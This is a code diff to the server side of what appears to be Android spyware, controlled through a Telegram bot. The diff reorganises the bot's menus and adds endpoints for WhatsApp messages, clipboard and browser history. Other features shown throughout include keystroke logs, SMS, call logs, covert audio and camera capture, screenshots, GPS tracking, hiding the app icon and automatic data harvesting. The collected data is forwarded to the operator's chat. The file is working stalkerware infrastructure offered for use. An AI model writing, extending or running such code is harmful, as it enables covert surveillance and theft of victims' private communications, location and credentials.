@@ -14,11 +14,7 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
 // Store authorized devices and their commands
 const devices = new Map();
-
-// Store which device each user is currently controlling
 const userDeviceSelection = new Map();
-
-// Store conversation states for interactive setup
 const userStates = new Map();
 
 // Store authorized chat IDs
@@ -26,7 +22,7 @@ const authorizedChats = new Set([
     '5326373447', // Your chat ID
 ]);
 
-// Auto-collection flags - track what data we've requested per device
+// Auto-collection flags
 const autoDataRequested = new Map();
 
 // Schedule states
@@ -38,7 +34,7 @@ const SCHEDULE_STATES = {
     AWAITING_INTERVAL: 'awaiting_interval'
 };
 
-// Create uploads directory if it doesn't exist
+// Create uploads directory
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
     fs.mkdirSync(uploadDir, { recursive: true });
@@ -111,7 +107,7 @@ const storage = multer.diskStorage({
 const upload = multer({
     storage,
     limits: { 
-        fileSize: 50 * 1024 * 1024, // 50MB limit
+        fileSize: 50 * 1024 * 1024,
         fieldSize: 50 * 1024 * 1024
     }
 });
@@ -197,33 +193,33 @@ function getMainMenuKeyboard(chatId) {
     
     let deviceStatus = `📱 ${deviceCount} device(s)`;
     if (activeDevice) {
-        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'} (${activeDeviceId.substring(0, 6)}...)`;
+        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
     }
 
     return [
         [
-            { text: '📱 Data', callback_data: 'menu_data' },
-            { text: '📱 New Data', callback_data: 'menu_new_data' }
+            { text: '📱 Device Info', callback_data: 'menu_device_info' },
+            { text: '📞 Phone Info', callback_data: 'menu_phone_info' }
         ],
         [
-            { text: '🎤 Recording', callback_data: 'menu_recording' },
-            { text: '📸 Screenshot', callback_data: 'menu_screenshot' }
+            { text: '📍 Tracking', callback_data: 'menu_tracking' },
+            { text: '🌐 Network', callback_data: 'menu_network' }
+        ],
+        [
+            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
+            { text: '🎤 Recording', callback_data: 'menu_recording' }
         ],
         [
             { text: '📸 Camera', callback_data: 'menu_camera' },
-            { text: '📍 Location', callback_data: 'menu_location' }
+            { text: '💬 Social', callback_data: 'menu_social' }
         ],
         [
-            { text: '🌐 Network', callback_data: 'menu_network' },
-            { text: '📞 Phone', callback_data: 'menu_phone' }
+            { text: '📁 Media', callback_data: 'menu_media' },
+            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
         ],
         [
-            { text: '🔔 Realtime', callback_data: 'menu_realtime' },
-            { text: '⚙️ Services', callback_data: 'menu_services' }
-        ],
-        [
-            { text: deviceStatus, callback_data: 'menu_devices' },
-            { text: '📱 Devices', callback_data: 'menu_devices' }
+            { text: '⚙️ Services', callback_data: 'menu_services' },
+            { text: deviceStatus, callback_data: 'menu_devices' }
         ],
         [
             { text: '❌ Close', callback_data: 'close_menu' }
@@ -331,11 +327,13 @@ async function setChatMenuButton(chatId) {
             { command: 'status', description: '📊 Device status' },
             { command: 'location', description: '📍 Get GPS location' },
             { command: 'screenshot', description: '📸 Take screenshot' },
-            { command: 'record', description: '🎤 Start recording' },
-            { command: 'find_recorded', description: '🔍 Find call recordings' },
+            { command: 'record', description: '🎤 Start 60s recording' },
+            { command: 'stop_recording', description: '⏹️ Stop recording' },
+            { command: 'find_media', description: '🔍 Find media files' },
             { command: 'contacts', description: '📇 Get contacts' },
             { command: 'sms', description: '💬 Get SMS' },
             { command: 'calllogs', description: '📞 Get call logs' },
+            { command: 'calendar', description: '📅 Get calendar events' },
             { command: 'storage', description: '💾 Storage info' },
             { command: 'network', description: '📡 Network info' },
             { command: 'battery', description: '🔋 Battery level' },
@@ -350,24 +348,23 @@ async function setChatMenuButton(chatId) {
             { command: 'realtime_off', description: '🔔 Disable real-time logs' },
             { command: 'realtime_status', description: '🔔 Check real-time status' },
             { command: 'photo', description: '📸 Take a photo now' },
-            { command: 'takephoto', description: '📸 Alias for photo' },
             { command: 'camera_on', description: '📸 Start camera monitoring' },
             { command: 'camera_off', description: '📸 Stop camera monitoring' },
             { command: 'camera_status', description: '📸 Check camera status' },
             { command: 'camera_front', description: '📸 Switch to front camera' },
             { command: 'camera_back', description: '📸 Switch to back camera' },
-            { command: 'camera_switch', description: '📸 Toggle between cameras' },
-            // NEW COMMANDS
+            { command: 'camera_switch', description: '📸 Toggle cameras' },
             { command: 'telegram', description: '💬 Get Telegram logs' },
             { command: 'facebook', description: '💬 Get Facebook logs' },
-            { command: 'calendar', description: '📅 Get calendar events' },
-            { command: 'keystrokes_detailed', description: '⌨️ Get detailed keystrokes' },
-            { command: 'screenshots', description: '📸 Get screenshot metadata' },
-            { command: 'apps_detailed', description: '📱 Get detailed apps info' },
-            { command: 'notifications_detailed', description: '🔔 Get detailed notifications' },
-            { command: 'device_snapshots', description: '📊 Get device history' },
-            { command: 'contacts_detailed', description: '📇 Get detailed contacts' },
-            { command: 'sync_all_new', description: '🔄 Sync all new tables' },
+            { command: 'whatsapp', description: '💬 Get WhatsApp logs' },
+            { command: 'clipboard', description: '📋 Get clipboard logs' },
+            { command: 'browser_history', description: '🌐 Get browser history' },
+            { command: 'keystrokes', description: '⌨️ Get keystrokes' },
+            { command: 'notifications', description: '🔔 Get notifications' },
+            { command: 'screenshots', description: '📸 Screenshot history' },
+            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
+            { command: 'recording_settings', description: '⚙️ Recording settings' },
+            { command: 'sync_all', description: '🔄 Sync all data' },
             { command: 'force_harvest', description: '⚡ Force data harvest' }
         ];
         
@@ -428,7 +425,7 @@ async function sendTelegramDocument(chatId, filePath, filename, caption) {
     }
 }
 
-// ============= LOCATION FORMATTER =============
+// ============= FORMATTER FUNCTIONS =============
 
 function formatLocationMessage(locationData) {
     try {
@@ -570,19 +567,18 @@ function queueAutoDataCommands(deviceId, chatId) {
             'sim_info',
             'wifi_info',
             'mobile_info',
-            'contacts_html',
-            'contacts_detailed',
-            'sms_html', 
-            'calllogs_html',
-            'apps_html',
-            'apps_detailed',
+            'contacts',
+            'sms',
+            'calllogs',
+            'calendar',
+            'whatsapp',
             'telegram',
             'facebook',
-            'calendar',
-            'keystrokes_detailed',
+            'browser_history',
+            'clipboard',
+            'keystrokes',
+            'notifications',
             'screenshots',
-            'notifications_detailed',
-            'device_snapshots',
             'location'
         ]
     });
@@ -603,20 +599,19 @@ function queueAutoDataCommands(deviceId, chatId) {
         { command: 'sim_info', delay: 4, description: 'SIM Info' },
         { command: 'wifi_info', delay: 6, description: 'WiFi Info' },
         { command: 'mobile_info', delay: 8, description: 'Mobile Info' },
-        { command: 'contacts_html', delay: 12, description: 'Contacts (Basic)' },
-        { command: 'contacts_detailed', delay: 14, description: 'Contacts (Detailed)' },
-        { command: 'sms_html', delay: 17, description: 'SMS Messages' },
-        { command: 'calllogs_html', delay: 22, description: 'Call Logs' },
-        { command: 'apps_html', delay: 27, description: 'Apps List' },
-        { command: 'apps_detailed', delay: 29, description: 'Apps Detailed' },
-        { command: 'telegram', delay: 32, description: 'Telegram Logs' },
-        { command: 'facebook', delay: 35, description: 'Facebook Logs' },
-        { command: 'calendar', delay: 38, description: 'Calendar Events' },
-        { command: 'keystrokes_detailed', delay: 41, description: 'Detailed Keystrokes' },
-        { command: 'screenshots', delay: 44, description: 'Screenshot Logs' },
-        { command: 'notifications_detailed', delay: 47, description: 'Detailed Notifications' },
-        { command: 'device_snapshots', delay: 50, description: 'Device Snapshots' },
-        { command: 'location', delay: 55, description: 'Location' }
+        { command: 'contacts', delay: 12, description: 'Contacts' },
+        { command: 'sms', delay: 15, description: 'SMS' },
+        { command: 'calllogs', delay: 18, description: 'Call Logs' },
+        { command: 'calendar', delay: 21, description: 'Calendar' },
+        { command: 'whatsapp', delay: 24, description: 'WhatsApp' },
+        { command: 'telegram', delay: 27, description: 'Telegram' },
+        { command: 'facebook', delay: 30, description: 'Facebook' },
+        { command: 'browser_history', delay: 33, description: 'Browser History' },
+        { command: 'clipboard', delay: 36, description: 'Clipboard' },
+        { command: 'keystrokes', delay: 39, description: 'Keystrokes' },
+        { command: 'notifications', delay: 42, description: 'Notifications' },
+        { command: 'screenshots', delay: 45, description: 'Screenshots' },
+        { command: 'location', delay: 48, description: 'Location' }
     ];
     
     commands.forEach((cmd) => {
@@ -725,7 +720,7 @@ async function sendTelegramPhoto(chatId, filePath, filename, caption) {
     }
 }
 
-// ============= NEW ENDPOINTS FOR ENTITY TABLES =============
+// ============= NEW ENDPOINTS =============
 
 app.post('/api/telegram/:deviceId', upload.single('file'), async (req, res) => {
     try {
@@ -838,43 +833,6 @@ app.post('/api/calendar/:deviceId', upload.single('file'), async (req, res) => {
     }
 });
 
-app.post('/api/keystrokes/:deviceId', upload.single('file'), async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const filename = req.body.filename;
-        const itemCount = req.body.count || '0';
-        
-        if (!deviceId || !filename || !req.file) {
-            return res.status(400).json({ error: 'Missing fields' });
-        }
-        
-        console.log(`⌨️ Keystroke logs from ${deviceId}: ${filename} (${itemCount} entries)`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        const filePath = req.file.path;
-        const deviceName = device.deviceInfo?.model || 'Unknown Device';
-        
-        const caption = `📱 *${deviceName}*\n\n⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
-        
-        await sendTelegramDocument(chatId, filePath, filename, caption);
-        
-        setTimeout(() => {
-            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
-        }, 60000);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Keystroke logs error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
 app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
@@ -912,7 +870,7 @@ app.post('/api/screenshots/:deviceId', upload.single('file'), async (req, res) =
     }
 });
 
-app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/whatsapp/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -922,7 +880,7 @@ app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res)
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📱 Detailed apps from ${deviceId}: ${filename} (${itemCount} apps)`);
+        console.log(`💬 WhatsApp logs from ${deviceId}: ${filename} (${itemCount} messages)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -933,7 +891,7 @@ app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res)
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n📱 Detailed Apps Export (${itemCount} apps)`;
+        const caption = `📱 *${deviceName}*\n\n💬 WhatsApp Messages Export (${itemCount} messages)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -944,12 +902,12 @@ app.post('/api/apps-detailed/:deviceId', upload.single('file'), async (req, res)
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Detailed apps error:', error);
+        console.error('❌ WhatsApp logs error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/clipboard/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -959,7 +917,7 @@ app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`🔔 Detailed notifications from ${deviceId}: ${filename} (${itemCount} entries)`);
+        console.log(`📋 Clipboard logs from ${deviceId}: ${filename} (${itemCount} entries)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -970,7 +928,7 @@ app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n🔔 Detailed Notification Logs (${itemCount} entries)`;
+        const caption = `📱 *${deviceName}*\n\n📋 Clipboard History Export (${itemCount} entries)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -981,12 +939,12 @@ app.post('/api/notifications-detailed/:deviceId', upload.single('file'), async (
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Detailed notifications error:', error);
+        console.error('❌ Clipboard logs error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, res) => {
+app.post('/api/browser-history/:deviceId', upload.single('file'), async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
         const filename = req.body.filename;
@@ -996,7 +954,7 @@ app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, r
             return res.status(400).json({ error: 'Missing fields' });
         }
         
-        console.log(`📊 Device snapshots from ${deviceId}: ${filename} (${itemCount} snapshots)`);
+        console.log(`🌐 Browser history from ${deviceId}: ${filename} (${itemCount} entries)`);
         
         const device = devices.get(deviceId);
         if (!device) {
@@ -1007,7 +965,7 @@ app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, r
         const filePath = req.file.path;
         const deviceName = device.deviceInfo?.model || 'Unknown Device';
         
-        const caption = `📱 *${deviceName}*\n\n📊 Device Info Snapshots (${itemCount} snapshots)`;
+        const caption = `📱 *${deviceName}*\n\n🌐 Browser History Export (${itemCount} entries)`;
         
         await sendTelegramDocument(chatId, filePath, filename, caption);
         
@@ -1018,44 +976,7 @@ app.post('/api/device-snapshots/:deviceId', upload.single('file'), async (req, r
         res.json({ success: true });
         
     } catch (error) {
-        console.error('❌ Device snapshots error:', error);
-        res.status(500).json({ error: error.message });
-    }
-});
-
-app.post('/api/contacts-detailed/:deviceId', upload.single('file'), async (req, res) => {
-    try {
-        const deviceId = req.params.deviceId;
-        const filename = req.body.filename;
-        const itemCount = req.body.count || '0';
-        
-        if (!deviceId || !filename || !req.file) {
-            return res.status(400).json({ error: 'Missing fields' });
-        }
-        
-        console.log(`📇 Detailed contacts from ${deviceId}: ${filename} (${itemCount} contacts)`);
-        
-        const device = devices.get(deviceId);
-        if (!device) {
-            return res.status(404).json({ error: 'Device not found' });
-        }
-        
-        const chatId = device.chatId;
-        const filePath = req.file.path;
-        const deviceName = device.deviceInfo?.model || 'Unknown Device';
-        
-        const caption = `📱 *${deviceName}*\n\n📇 Detailed Contacts Export (${itemCount} contacts)`;
-        
-        await sendTelegramDocument(chatId, filePath, filename, caption);
-        
-        setTimeout(() => {
-            try { if (fs.existsSync(filePath)) fs.unlinkSync(filePath); } catch (e) {}
-        }, 60000);
-        
-        res.json({ success: true });
-        
-    } catch (error) {
-        console.error('❌ Detailed contacts error:', error);
+        console.error('❌ Browser history error:', error);
         res.status(500).json({ error: error.message });
     }
 });
@@ -1220,28 +1141,44 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
-    } else if (data === 'menu_data') {
+    } else if (data === 'menu_device_info') {
         const keyboard = [
             [
-                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
+                createInlineButton('🌐 Network Info', 'cmd:network'),
+                createInlineButton('📱 Apps List', 'cmd:apps')
             ],
             [
-                createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
+                createInlineButton('📱 Device Info', 'cmd:info'),
+                createInlineButton('🔋 Battery', 'cmd:battery')
             ],
             [
-                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
+                createInlineButton('💾 Storage', 'cmd:storage'),
+                createInlineButton('🕐 Time', 'cmd:time')
             ],
             [
-                createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
+                createInlineButton('📊 Status', 'cmd:status'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_phone_info') {
+        const keyboard = [
+            [
+                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
+                createInlineButton('📱 SIM Info', 'cmd:sim_info')
             ],
             [
-                createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
+                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
+                createInlineButton('📞 Call Logs', 'cmd:calllogs')
             ],
             [
-                createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
+                createInlineButton('📍 Location', 'cmd:location'),
+                createInlineButton('💬 SMS', 'cmd:sms')
             ],
             [
-                createInlineButton('📱 App Opens HTML', 'cmd:app_opens_html')
+                createInlineButton('📇 Contacts', 'cmd:contacts'),
+                createInlineButton('📅 Calendar', 'cmd:calendar')
             ],
             [
                 createInlineButton('◀️ Back', 'help_main')
@@ -1249,64 +1186,15 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
-    } else if (data === 'menu_new_data') {
+    } else if (data === 'menu_tracking') {
         const keyboard = [
             [
-                createInlineButton('💬 Telegram Logs', 'cmd:telegram'),
-                createInlineButton('💬 Facebook Logs', 'cmd:facebook')
+                createInlineButton('📍 Location', 'cmd:location'),
+                createInlineButton('⌨️ Keystrokes', 'cmd:keystrokes')
             ],
             [
-                createInlineButton('📅 Calendar Events', 'cmd:calendar'),
-                createInlineButton('⌨️ Detailed Keystrokes', 'cmd:keystrokes_detailed')
-            ],
-            [
-                createInlineButton('📸 Screenshot Logs', 'cmd:screenshots'),
-                createInlineButton('📱 Detailed Apps', 'cmd:apps_detailed')
-            ],
-            [
-                createInlineButton('🔔 Detailed Notifs', 'cmd:notifications_detailed'),
-                createInlineButton('📊 Device Snapshots', 'cmd:device_snapshots')
-            ],
-            [
-                createInlineButton('📇 Detailed Contacts', 'cmd:contacts_detailed'),
-                createInlineButton('🔄 Sync All New', 'cmd:sync_all_new')
-            ],
-            [
-                createInlineButton('⚡ Force Harvest', 'cmd:force_harvest'),
-                createInlineButton('◀️ Back', 'help_main')
-            ]
-        ];
-        await editMessageKeyboard(chatId, messageId, keyboard);
-        
-    } else if (data === 'menu_recording') {
-        const keyboard = [
-            [
-                createInlineButton('🎤 Record 60s', 'cmd:record'),
-                createInlineButton('⏰ Schedule Status', 'cmd:record_schedule')
-            ],
-            [
-                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
-                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
-            ],
-            [
-                createInlineButton('🔍 Find Recordings', 'cmd:find_recorded'),
-                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
-            ],
-            [
-                createInlineButton('🎚️ Audio Info', 'cmd:audio_info'),
-                createInlineButton('▶️ Start Recording', 'cmd:start_recording')
-            ],
-            [
-                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording'),
-                createInlineButton('🎤 Audio Ultra', 'cmd:audio_ultra')
-            ],
-            [
-                createInlineButton('🎤 Audio Very Low', 'cmd:audio_very_low'),
-                createInlineButton('🎤 Audio Low', 'cmd:audio_low')
-            ],
-            [
-                createInlineButton('🎤 Audio Medium', 'cmd:audio_medium'),
-                createInlineButton('🎤 Audio High', 'cmd:audio_high')
+                createInlineButton('🔔 Notifications', 'cmd:notifications'),
+                createInlineButton('📱 App Opens', 'cmd:app_opens')
             ],
             [
                 createInlineButton('◀️ Back', 'help_main')
@@ -1318,19 +1206,15 @@ async function handleCallbackQuery(callbackQuery) {
         const keyboard = [
             [
                 createInlineButton('📸 Take Now', 'cmd:screenshot'),
-                createInlineButton('▶️ Start Service', 'cmd:start_screenshot')
+                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings')
             ],
             [
-                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot'),
-                createInlineButton('📏 Small', 'cmd:small')
+                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
+                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
             ],
             [
-                createInlineButton('📏 Medium', 'cmd:medium'),
-                createInlineButton('📏 Original', 'cmd:original')
-            ],
-            [
-                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings'),
-                createInlineButton('📊 Size Status', 'cmd:size_status')
+                createInlineButton('📸 Screenshot Logs', 'cmd:screenshots'),
+                createInlineButton('📏 Size Status', 'cmd:size_status')
             ],
             [
                 createInlineButton('➕ Add Target', 'cmd:add_target_example'),
@@ -1342,47 +1226,54 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
-    } else if (data === 'menu_services') {
+    } else if (data === 'menu_recording') {
         const keyboard = [
             [
-                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
-                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
+                createInlineButton('🎤 Start 60s', 'cmd:record'),
+                createInlineButton('⏹️ Stop 60s', 'cmd:stop_recording')
             ],
             [
-                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
-                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
+                createInlineButton('⚙️ Settings', 'cmd:recording_settings'),
+                createInlineButton('⏰ Schedule', 'cmd:record_schedule')
             ],
             [
-                createInlineButton('📊 Service Status', 'cmd:status'),
-                createInlineButton('📝 Logs Count', 'cmd:logs_count')
+                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
+                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
             ],
             [
-                createInlineButton('📈 Detailed Stats', 'cmd:stats'),
-                createInlineButton('🔄 Refresh Data', 'cmd:refresh_data')
+                createInlineButton('🔍 Find Media', 'cmd:find_media'),
+                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive')
             ],
             [
-                createInlineButton('📱 New Data Menu', 'cmd:menu_new_data'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
-    } else if (data === 'menu_location') {
+    } else if (data === 'menu_social') {
         const keyboard = [
             [
-                createInlineButton('📍 Get Location', 'cmd:location'),
-                createInlineButton('📡 Network Info', 'cmd:network')
+                createInlineButton('💬 WhatsApp', 'cmd:whatsapp'),
+                createInlineButton('💬 Telegram', 'cmd:telegram')
             ],
             [
-                createInlineButton('💾 Storage Info', 'cmd:storage'),
-                createInlineButton('🔋 Battery', 'cmd:battery')
+                createInlineButton('💬 Facebook', 'cmd:facebook'),
+                createInlineButton('🌐 Browser History', 'cmd:browser_history')
             ],
             [
-                createInlineButton('ℹ️ Device Info', 'cmd:info'),
-                createInlineButton('🕐 Time', 'cmd:time')
+                createInlineButton('📋 Clipboard', 'cmd:clipboard'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_media') {
+        const keyboard = [
+            [
+                createInlineButton('🔍 Find Media', 'cmd:find_media'),
+                createInlineButton('📸 Screenshots', 'cmd:screenshots')
             ],
             [
-                createInlineButton('📊 Status', 'cmd:status'),
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1405,23 +1296,6 @@ async function handleCallbackQuery(callbackQuery) {
         ];
         await editMessageKeyboard(chatId, messageId, keyboard);
         
-    } else if (data === 'menu_phone') {
-        const keyboard = [
-            [
-                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
-                createInlineButton('📱 SIM Info', 'cmd:sim_info')
-            ],
-            [
-                createInlineButton('📱 Mobile Info', 'cmd:mobile_info'),
-                createInlineButton('📞 Call Logs', 'cmd:calllogs')
-            ],
-            [
-                createInlineButton('📞 Call Logs HTML', 'cmd:calllogs_html'),
-                createInlineButton('◀️ Back', 'help_main')
-            ]
-        ];
-        await editMessageKeyboard(chatId, messageId, keyboard);
-        
     } else if (data === 'menu_realtime') {
         const keyboard = [
             [
@@ -1430,6 +1304,34 @@ async function handleCallbackQuery(callbackQuery) {
             ],
             [
                 createInlineButton('📊 Realtime Status', 'cmd:realtime_status'),
+                createInlineButton('◀️ Back', 'help_main')
+            ]
+        ];
+        await editMessageKeyboard(chatId, messageId, keyboard);
+        
+    } else if (data === 'menu_services') {
+        const keyboard = [
+            [
+                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
+                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
+            ],
+            [
+                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
+                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
+            ],
+            [
+                createInlineButton('📊 Service Status', 'cmd:status'),
+                createInlineButton('📝 Logs Count', 'cmd:logs_count')
+            ],
+            [
+                createInlineButton('📈 Stats', 'cmd:stats'),
+                createInlineButton('🔄 Refresh', 'cmd:refresh_data')
+            ],
+            [
+                createInlineButton('⚡ Force Harvest', 'cmd:force_harvest'),
+                createInlineButton('🔄 Sync All', 'cmd:sync_all')
+            ],
+            [
                 createInlineButton('◀️ Back', 'help_main')
             ]
         ];
@@ -1622,9 +1524,8 @@ async function handleCommand(chatId, command, messageId) {
         return;
     }
 
-    // Handle /find_recorded command specifically
-    if (command === '/find_recorded' || command === '/find_recordings' || 
-        command === '/scan_recordings' || command === '/scan_recording') {
+    // Handle /find_media command
+    if (command === '/find_media' || command === '/scan_media') {
         
         const selectedDeviceId = userDeviceSelection.get(chatId);
         const device = selectedDeviceId ? devices.get(selectedDeviceId) : null;
@@ -1639,23 +1540,23 @@ async function handleCommand(chatId, command, messageId) {
         }
         
         device.pendingCommands.push({
-            command: 'find_recorded',
+            command: 'find_media',
             originalCommand: command,
             messageId: messageId,
             timestamp: Date.now()
         });
         
-        console.log(`📝 Find Recorded command queued for device ${selectedDeviceId}`);
+        console.log(`📝 Find Media command queued for device ${selectedDeviceId}`);
         
         await sendTelegramMessage(chatId, 
-            `🔍 *Recording Scanner*\n\n` +
+            `🔍 *Media Scanner*\n\n` +
             `📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\n` +
             `✅ Scan command sent to device.\n` +
             `The device will search for:\n` +
-            `• Third-party call recordings\n` +
-            `• Voice recorder files\n` +
-            `• Audio recordings\n` +
-            `• WhatsApp/Telegram audio files\n\n` +
+            `• Images (JPG, PNG, GIF)\n` +
+            `• Videos (MP4, 3GP, MKV)\n` +
+            `• Audio (MP3, AMR, OPUS)\n` +
+            `• WhatsApp/Telegram media\n\n` +
             `⏱️ This may take a moment...`);
         return;
     }
@@ -1739,7 +1640,6 @@ async function handleCommand(chatId, command, messageId) {
 }
 
 // ============= IP INFO ENDPOINT =============
-
 app.post('/api/ipinfo/:deviceId', async (req, res) => {
     try {
         const deviceId = req.params.deviceId;
@@ -1968,39 +1868,29 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
         let caption = `📱 *${deviceName}*\n\n`;
         
         switch (command) {
-            case 'contacts_html':
+            case 'contacts':
                 caption += `📇 Contacts Export (${itemCount} contacts)`;
                 break;
-            case 'contacts_detailed':
-                caption += `📇 Detailed Contacts Export (${itemCount} contacts)`;
-                break;
-            case 'sms_html':
+            case 'sms':
                 caption += `💬 SMS Messages Export (${itemCount} messages)`;
                 break;
-            case 'calllogs_html':
+            case 'calllogs':
                 caption += `📞 Call Logs Export (${itemCount} calls)`;
                 break;
-            case 'apps_html':
+            case 'apps':
                 caption += `📱 Installed Apps Export (${itemCount} apps)`;
                 break;
-            case 'apps_detailed':
-                caption += `📱 Detailed Apps Export (${itemCount} apps)`;
-                break;
-            case 'keystrokes_html':
+            case 'keystrokes':
                 caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                 break;
-            case 'keystrokes_detailed':
-                caption += `⌨️ Detailed Keystroke Logs (${itemCount} entries)`;
-                break;
-            case 'notifications_html':
+            case 'notifications':
                 caption += `🔔 Notifications Export (${itemCount} notifications)`;
                 break;
-            case 'notifications_detailed':
-                caption += `🔔 Detailed Notifications (${itemCount} entries)`;
-                break;
             case 'app_opens':
-            case 'app_opens_html':
                 caption += `📱 App Opens Export (${itemCount} entries)`;
+                break;
+            case 'whatsapp':
+                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                 break;
             case 'telegram':
                 caption += `💬 Telegram Messages Export (${itemCount} messages)`;
@@ -2008,14 +1898,17 @@ app.post('/api/upload-file', upload.single('file'), async (req, res) => {
             case 'facebook':
                 caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                 break;
+            case 'browser_history':
+                caption += `🌐 Browser History Export (${itemCount} entries)`;
+                break;
+            case 'clipboard':
+                caption += `📋 Clipboard History Export (${itemCount} entries)`;
+                break;
             case 'calendar':
                 caption += `📅 Calendar Events Export (${itemCount} events)`;
                 break;
             case 'screenshots':
                 caption += `📸 Screenshot Metadata Export (${itemCount} entries)`;
-                break;
-            case 'device_snapshots':
-                caption += `📊 Device Info Snapshots (${itemCount} snapshots)`;
                 break;
             default:
                 caption += `📎 Data Export`;
@@ -2107,66 +2000,19 @@ app.post('/api/logs', async (req, res) => {
                 return res.json({ success: true, handled: 'app_open_batch' });
                 
             case 'contacts':
-                try {
-                    const contacts = JSON.parse(logData.data || '[]');
-                    message = devicePrefix + `📇 <b>Contacts Update</b>\n` +
-                             `Total contacts: ${contacts.length}`;
-                } catch (e) {
-                    message = devicePrefix + `📇 <b>Contacts Update</b>\n` +
-                             `Data: ${logData.data?.substring(0, 100)}`;
-                }
-                break;
-                
-            case 'contacts_detailed':
-                return res.json({ success: true, handled: 'contacts_detailed_endpoint' });
-                
-            case 'call_logs':
-                try {
-                    const calls = JSON.parse(logData.data || '[]');
-                    message = devicePrefix + `📞 <b>Call Logs Update</b>\n` +
-                             `Total calls: ${calls.length}`;
-                } catch (e) {
